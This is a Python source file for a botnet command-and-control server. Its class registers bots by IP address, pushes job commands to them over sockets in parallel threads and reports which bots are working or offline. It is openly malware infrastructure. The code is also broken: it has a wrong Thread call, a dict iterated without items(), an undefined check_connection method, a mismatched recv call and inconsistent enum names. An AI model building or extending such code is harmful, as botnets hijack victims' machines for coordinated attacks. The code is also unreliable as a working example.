import threading
import socket

import c2_pb2

from botnet_exceptions import *


class C2server():

    def __init__(self, user_id):
        self.user_id = user_id
        self.bots = {}

    def add_bot(self, bot):
        self.bots[bot.address[0]] = bot

    def start_job(self, command_id):
        response = c2_pb2.StartJobResponse()
        response.response = c2_pb2.StartJobResponse.Response.FAIL

        if not self.bots:
            raise NoBotsException()

        threads = [threading.Thread(self.command_bot, args=(command_id, bot)) for bot_address, bot in self.bots]

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()
        
        online_bots = 0
        for bot_address, bot in self.bots.items():
            return_bot = response.bots.add()
            return_bot.userId = bot.user_id
            return_bot.state = bot.state
            return_bot.address = bot_address

            if bot.state == c2_pb2.Bot.STATE.OFFLINE:
                continue
            online_bots += 1

        if online_bots:
            response.response = c2_pb2.StartJobResponse.Response.SUCCESS

        return response


    def command_bot(self, command_id, bot):
        if not self.check_connection(bot.bot_socket):
            bot.state = c2_pb2.Bot.State.OFFLINE
            return

        bot.bot_socket.sendall(str(command_id).encode())
        if bot.recv(1024).decode() == "Started":
            bot.state = c2_pb2.Bot.State.WORKING

    def is_socket_alive(self, sock):
        try:
            sock.sendall(b"Are you alive?")
            response = sock.recv(1024)
            if response == b"":
                return False
        # TODO: put in proper exception handling for dead socket
        except:
            return False
        return True
